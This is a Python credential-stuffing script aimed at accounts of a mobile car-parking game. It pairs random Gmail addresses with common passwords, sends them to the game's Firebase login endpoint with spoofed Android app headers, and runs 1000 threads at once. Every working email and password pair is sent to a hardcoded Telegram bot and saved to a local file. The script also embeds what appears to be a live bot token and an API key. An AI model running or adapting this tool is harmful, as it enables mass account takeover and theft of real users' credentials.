import requests
import json
import random
import threading
from threading import Thread, Lock
import time
import os

token = "8107170175:AAFuAMr0Jlrc-65SDHayb_885TXa4muqnL4"
id = "7036304065"


hits = 0
checker = 0
lock = Lock()

def clear_screen():
    pass

def car():
    global hits, checker
    while True:
        
        email_length = random.randint(2, 5)
        email=''.join(random.choice("qwertyuiopasdfghjklzxcvbnm1234567890")for i in range(email_length))+"@gmail.com"
        passw=''.join(random.choice(["123456","1234567","1234567","123123","1234567899","123456789","00000000"])for i in range(1))
        
        url = "https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM"
        
        payload = {
          "email": email,
          "password": passw,
          "returnSecureToken": True,
          "clientType": "CLIENT_TYPE_ANDROID"
        }
        
        headers = {
          'User-Agent': "Dalvik/2.1.0 (Linux; U; Android 16; Pixel 7 Pro Build/BP3A.251005.004.B1)",
          'Connection': "Keep-Alive",
          'Accept-Encoding': "gzip",
          'Content-Type': "application/json",
          'X-Android-Package': "com.olzhas.carparking.multyplayr",
          'X-Android-Cert': "2341AB18F1409D3E4151E10F47007996F123EC7C",
          'Accept-Language': "en-US, en-US",
          'X-Client-Version': "Android/Fallback/X23000000/FirebaseCore-Android",
          'X-Firebase-GMPID': "1:581727203278:android:af6b7dee042c8df539459f",
          'X-Firebase-Client': "H4sIAAAAAAAA_6tWykhNLCpJSk0sKVayio7VUSpLLSrOzM9TslIyUqoFAFyivEQfAAAA"
        }
        
        try:
            response = requests.post(url, data=json.dumps(payload), headers=headers).text
            
            with lock:
                checker += 1
                
                if "idToken" in response:
                    hits += 1
                    
                    print(f"\r\033[92m✅ Hit: {hits:>6}\033[0m | \033[94m📊 Checker: {checker:>6}\033[0m", end='')
                    
                    # إرسال إلى البوت مع الإيميل والباسورد
                    ff=f'''
Email : {email}
Password : {passw}
'''
                    tlg = f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text={ff}'
                    
                    try:
                        requests.post(tlg, timeout=5)
                        print(f"\n\033[92m✅ Sent to Bot: {email}:{passw}\033[0m")
                    except:
                        pass
                    
                    
                    with open('Hitscar.txt', 'a') as f:
                        f.write(f'{email}:{passw}\n')
                        
                else:
                    print(f"\r\033[92m✅ Hit: {hits:>6}\033[0m | \033[94m📊 Checker: {checker:>6}\033[0m", end='')
                    
        except:
            with lock:
                checker += 1
                print(f"\r\033[92m✅ Hit: {hits:>6}\033[0m | \033[94m📊 Checker: {checker:>6}\033[0m", end='')


clear_screen()
print("\033[94m🚀 Starting Checker...\033[0m")
print("\033[93m📊 Stats will be shown below:\033[0m")
print("-" * 40)


print(f"\r\033[92m✅ Hit: {0:>6}\033[0m | \033[94m📊 Checker: {0:>6}\033[0m", end='')

for i in range(1000):
    Thread(target=car).start()